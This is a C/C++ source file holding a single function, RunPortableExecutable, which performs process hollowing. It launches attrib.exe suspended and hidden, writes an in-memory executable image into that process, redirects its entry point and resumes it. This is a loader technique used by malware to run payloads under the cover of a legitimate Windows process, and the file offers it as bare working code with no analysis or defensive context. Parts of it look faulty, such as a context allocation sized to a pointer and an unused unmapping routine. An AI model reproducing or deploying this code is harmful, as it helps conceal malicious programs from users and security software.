#include <stdafx.h>
int RunPortableExecutable(void* Image) {
	IMAGE_DOS_HEADER* DOSHeader;
	IMAGE_NT_HEADERS* NtHeader;
	IMAGE_SECTION_HEADER* SectionHeader;
	PROCESS_INFORMATION PI;
	STARTUPINFOA SI;
	CONTEXT* CTX;
	DWORD* ImageBase; // base address of the image
	void* pImageBase; // pointer to the image base
	int count;
	char *CurrentFilePath = "C:\\Windows\\System32\\attrib.exe";


	DOSHeader = PIMAGE_DOS_HEADER(Image);
	NtHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader->e_lfanew);

	if (NtHeader->Signature == IMAGE_NT_SIGNATURE) {
		ZeroMemory(&PI, sizeof(PI));
		ZeroMemory(&SI, sizeof(SI));
		typedef LONG(WINAPI * NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
		NtUnmapViewOfSection mNtUnmapViewOfSection;



		if (CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &SI, &PI)) {
			CTX = PCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
			CTX->ContextFlags = CONTEXT_FULL;
			if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) {
				ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);
				pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
					NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
				WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
				for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++) {
					SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));
					WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
						LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
				}
				WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8), LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);
				CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
				SetThreadContext(PI.hThread, LPCONTEXT(CTX));
				ResumeThread(PI.hThread);
				return 0;
			}
		}

	}
}